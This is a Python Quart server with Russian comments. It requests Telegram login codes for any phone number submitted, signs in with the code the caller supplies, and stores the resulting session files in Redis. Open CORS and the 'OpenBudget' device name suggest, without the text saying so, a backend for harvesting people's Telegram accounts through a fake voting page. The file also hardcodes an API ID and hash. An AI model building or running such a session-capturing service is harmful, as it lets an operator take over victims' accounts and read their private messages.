import os
import asyncio
import redis
import hypercorn.asyncio
from hypercorn.config import Config
from quart import Quart, request, jsonify
from quart_cors import cors
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

# --- Настройки ---
API_ID = int(os.getenv("API_ID", 26595249))  # Берем API_ID из переменных окружения
API_HASH = os.getenv("API_HASH", "9480dce5299fb30b4e520242dd6d87d8")  # Берем API_HASH
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379")  # Берем URL Redis из окружения

# Подключение к Redis
redis_client = redis.from_url(REDIS_URL, decode_responses=True)

app = Quart(__name__)
app = cors(app, allow_origin="*")

async def get_client(phone_number):
    """ Создает или загружает TelegramClient из Redis """
    session_data = redis_client.get(f"session:{phone_number}")
    session_path = f"/tmp/{phone_number}.session"  # Временная папка в контейнере

    if session_data:
        with open(session_path, "wb") as f:
            f.write(session_data.encode())  # Восстанавливаем session-файл

    device_model = "OpenBudget"
    
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    return client

async def save_session(phone_number):
    """ Сохраняет session файл в Redis """
    session_path = f"/tmp/{phone_number}.session"

    if os.path.exists(session_path):
        with open(session_path, "rb") as f:
            redis_client.set(f"session:{phone_number}", f.read())  # Сохраняем в Redis

@app.post("/send_phone")
async def send_phone():
    try:
        data = await request.json
        phone_number = data.get("phone")

        if not phone_number:
            return jsonify({"success": False, "error": "Номер телефона обязателен"}), 400

        client = await get_client(phone_number)

        if not await client.is_user_authorized():
            send_code = await client.send_code_request(phone_number)
            redis_client.set(f"code_hash:{phone_number}", send_code.phone_code_hash)

        return jsonify({"success": True, "message": "Код отправлен"}), 200

    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.post("/send_code")
async def send_code():
    try:
        data = await request.json
        phone_number = data.get("phone")
        code = data.get("code")

        if not phone_number or not code:
            return jsonify({"success": False, "error": "Номер и код обязательны"}), 400

        phone_code_hash = redis_client.get(f"code_hash:{phone_number}")

        if not phone_code_hash:
            return jsonify({"success": False, "error": "Сначала запросите код"}), 400

        client = await get_client(phone_number)

        if not await client.is_user_authorized():
            await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
            await save_session(phone_number)  # Сохраняем сессию после входа

        return jsonify({"success": True, "message": "Вход выполнен"}), 200

    except SessionPasswordNeededError:
        return jsonify({"success": False, "error": "Нужен пароль 2FA"}), 401
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

PORT = int(os.getenv("PORT", 5701))

if __name__ == "__main__":
    config = Config()
    config.bind = [f"0.0.0.0:{PORT}"]
    asyncio.run(hypercorn.asyncio.serve(app, config))




